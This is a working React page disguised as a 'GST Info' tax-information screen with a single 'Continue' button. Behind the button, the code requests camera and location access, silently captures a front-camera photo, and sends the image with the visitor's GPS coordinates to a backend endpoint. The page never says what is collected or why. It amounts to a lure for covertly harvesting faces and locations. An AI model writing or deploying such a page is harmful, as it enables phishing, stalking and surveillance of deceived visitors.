"use client";

import { useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);
  const [busy, setBusy] = useState(false);

  async function captureAll() {
    if (busy) return;
    setBusy(true);

    try {
      // 1️⃣ Request CAMERA permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      // 2️⃣ Request LOCATION permission
      const position = await new Promise<GeolocationPosition>(
        (resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
      );

      // 3️⃣ Show preview FIRST
      setShowPreview(true);

      // ⏱ wait for React to render <video>
      await new Promise(res => setTimeout(res, 0));

      const video = videoRef.current;
      if (!video) {
        throw new Error("Video element not mounted");
      }

      // 4️⃣ Attach stream
      video.srcObject = stream;
      video.muted = true;
      await video.play();

      // ⏱ allow browser to paint a real frame
      await new Promise(res => setTimeout(res, 1000));

      // 5️⃣ Capture image
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0);

      const image = canvas.toDataURL("image/jpeg", 0.9);
      console.log("Image length:", image.length);

      // 6️⃣ Cleanup
      stream.getTracks().forEach(t => t.stop());
      setShowPreview(false);

      // 7️⃣ Send to backend
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      });

    } catch (err: any) {
      console.error("Capture failed:", err);
      alert("ERROR → " + (err?.message || err));
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="error-container">
      <h1>GST Info</h1>
      <p>Click here to continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          className="camera-preview"
        />
      )}

      <button
        onClick={captureAll}
        disabled={busy}
        className="continue-btn"
      >
        {busy ? "Please wait…" : "Continue"}
      </button>
    </div>
  );
}
